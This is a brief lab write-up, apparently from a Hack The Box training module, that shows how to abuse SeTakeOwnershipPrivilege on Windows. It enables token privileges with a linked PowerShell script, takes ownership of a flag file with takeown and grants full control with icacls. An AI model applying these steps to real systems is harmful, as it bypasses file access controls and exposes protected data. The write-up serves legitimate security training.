### Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.


I enabled it by using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
![](Screenshot%202026-08-18%20at%2022.00.06.png)

I took the ownership of the flag.txt successfully

```powershell
takeown /f 'C:\TakeOwn\flag.txt'
```
![](Screenshot%202026-08-18%20at%2022.04.53.png)

Now, I need to grant myself permissions of the flag.txt by using `icals`

```powershell
icacls "C:\TakeOwn\flag.txt" /grant htb-student:F
```
![](Screenshot%202026-08-18%20at%2022.05.07.png)

Finally, just cat the flag.txt
![](Screenshot%202026-08-18%20at%2022.05.35.png)
